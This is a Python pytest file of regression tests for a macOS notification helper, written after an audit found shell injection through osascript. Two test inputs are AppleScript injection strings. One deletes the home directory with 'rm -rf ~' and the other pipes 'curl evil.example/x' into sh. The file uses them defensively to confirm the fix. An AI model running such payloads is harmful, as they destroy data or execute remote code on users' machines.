# Copyright 2026 GoCloudForge, Inc. All rights reserved.
"""Regression tests for the macOS notification helper (audit finding C4).

The helper used to invoke `osascript` via `subprocess.run(..., shell=True)`
with a user-controlled string from `config.toml`. A user editing the
config to embed shell metacharacters could achieve local code exec.

The fix:
  - drop `shell=True`
  - pass argv as a list: ["osascript", "-e", applescript_literal]
  - escape `"` and `\\` at the AppleScript string-literal level (NOT bash escape)

These tests monkeypatch `subprocess.run`, so they pass on Linux CI runners
where `osascript` does not exist.
"""

from __future__ import annotations

import subprocess

import pytest

from claude_monitoring.lifecycle import notify


def test_notification_does_not_use_shell_true(monkeypatch):
    calls: list[tuple] = []

    def spy(*args, **kwargs):
        calls.append((args, kwargs))
        return subprocess.CompletedProcess(args[0], 0, b"", b"")

    monkeypatch.setattr(subprocess, "run", spy)
    notify("test title", "test body")

    assert calls, "notify() did not invoke subprocess.run"
    assert all(not kw.get("shell", False) for _, kw in calls)
    assert all(isinstance(args[0], list) for args, _ in calls), "argv must be a list, not a single string"


def test_notification_blocks_shell_metacharacters_in_title(monkeypatch):
    calls: list[tuple] = []
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: calls.append((a, kw)) or subprocess.CompletedProcess(a[0], 0, b"", b""),
    )
    notify('"; do shell script "rm -rf ~"', "body")

    assert calls, "notify() did not invoke subprocess.run"
    for args, _ in calls:
        argv = args[0]
        if "-e" in argv:
            e_arg = argv[argv.index("-e") + 1]
            # The injected `do shell script "rm -rf ~"` must not survive
            # as a standalone AppleScript statement. Escaped quotes around
            # `rm -rf ~` would keep it inside a string literal, which is inert.
            assert 'do shell script "rm -rf ~"' not in e_arg


def test_notification_blocks_shell_metacharacters_in_body(monkeypatch):
    calls: list[tuple] = []
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: calls.append((a, kw)) or subprocess.CompletedProcess(a[0], 0, b"", b""),
    )
    notify("title", '"; do shell script "curl evil.example/x | sh"')

    assert calls, "notify() did not invoke subprocess.run"
    for args, _ in calls:
        argv = args[0]
        if "-e" in argv:
            e_arg = argv[argv.index("-e") + 1]
            assert 'do shell script "curl evil.example/x | sh"' not in e_arg


def test_notification_handles_unicode_safely(monkeypatch):
    calls: list[tuple] = []
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: calls.append((a, kw)) or subprocess.CompletedProcess(a[0], 0, b"", b""),
    )
    # Must not raise on emoji + non-Latin scripts.
    notify("\U0001f525 Critical \uc548\ub155\ud558\uc138\uc694", "Unicode body \u0645\u0631\u062d\u0628\u0627")
    assert calls, "notify() did not invoke subprocess.run"


def test_notification_argv_uses_osascript_with_dash_e(monkeypatch):
    calls: list[tuple] = []
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: calls.append((a, kw)) or subprocess.CompletedProcess(a[0], 0, b"", b""),
    )
    notify("title", "body")
    assert calls
    argv = calls[0][0][0]
    assert argv[0] == "osascript"
    assert "-e" in argv


@pytest.mark.parametrize(
    "title,body",
    [
        ('he said "hi"', "plain"),
        ("plain", 'he said "hi"'),
        ("back\\slash", "back\\slash"),
        ("quote-and-\\back", 'mixed "with" \\both'),
    ],
)
def test_notification_escapes_quotes_and_backslashes(monkeypatch, title, body):
    calls: list[tuple] = []
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *a, **kw: calls.append((a, kw)) or subprocess.CompletedProcess(a[0], 0, b"", b""),
    )
    notify(title, body)
    assert calls
    argv = calls[0][0][0]
    e_arg = argv[argv.index("-e") + 1]
    # The AppleScript literal must be wrapped in `"..."` and contain only
    # escaped quotes inside. Verify the result starts/ends with `"` after
    # `display notification ` / `with title `.
    assert e_arg.startswith('display notification "')
    assert ' with title "' in e_arg
    assert e_arg.endswith('"')
